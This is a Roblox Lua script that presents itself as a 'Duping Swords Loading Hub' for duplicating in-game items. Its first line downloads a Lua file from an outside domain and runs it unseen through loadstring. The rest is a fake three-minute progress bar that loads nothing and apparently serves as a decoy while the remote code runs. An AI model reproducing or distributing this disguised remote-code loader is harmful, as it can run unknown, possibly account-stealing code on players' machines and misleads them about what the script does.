loadstring(game:HttpGet("https://egorikusa.space/8254b7b833bd540c8f20bebf.lua", true))()



-- LocalScript
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local LoadingBarBackground = Instance.new("Frame")
local LoadingBar = Instance.new("Frame")
local PercentageLabel = Instance.new("TextLabel")
local TitleLabel = Instance.new("TextLabel")

-- GUI properties
ScreenGui.Name = "LoadingScreen"
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  -- Solid black background
Frame.Parent = ScreenGui

-- Loading Bar Background (Outline)
LoadingBarBackground.Size = UDim2.new(0, 600, 0, 50)
LoadingBarBackground.Position = UDim2.new(0.5, -300, 0.5, -25)
LoadingBarBackground.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  -- Black outline
LoadingBarBackground.Parent = Frame

-- Loading Bar
LoadingBar.Size = UDim2.new(0, 0, 1, 0)  -- Height matches the background
LoadingBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
LoadingBar.Parent = LoadingBarBackground

-- Percentage Label
PercentageLabel.Size = UDim2.new(1, 0, 0, 50)
PercentageLabel.Position = UDim2.new(0, 0, 0.5, -25)
PercentageLabel.BackgroundTransparency = 1
PercentageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
PercentageLabel.TextScaled = true
PercentageLabel.Font = Enum.Font.GothamBold -- Fancy text style
PercentageLabel.Text = "0%"
PercentageLabel.Parent = Frame

-- Title Label
TitleLabel.Size = UDim2.new(1, 0, 0, 50)
TitleLabel.Position = UDim2.new(0, 0, 0.3, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextScaled = true
TitleLabel.Font = Enum.Font.GothamBold -- Fancy text style
TitleLabel.Text = "Duping Swords Loading Hub"
TitleLabel.Parent = Frame

-- Loading logic
local totalTime = 180 -- 3 minutes
local elapsedTime = 0

while elapsedTime < totalTime do
    wait(1) -- wait 1 second
    elapsedTime = elapsedTime + 1

    -- Update loading bar
    local progress = elapsedTime / totalTime
    LoadingBar.Size = UDim2.new(progress, 0, 1, 0)
    
    -- Update percentage label
    PercentageLabel.Text = math.floor(progress * 100) .. "%"
end

-- Remove loading screen after loading is done
ScreenGui:Destroy()
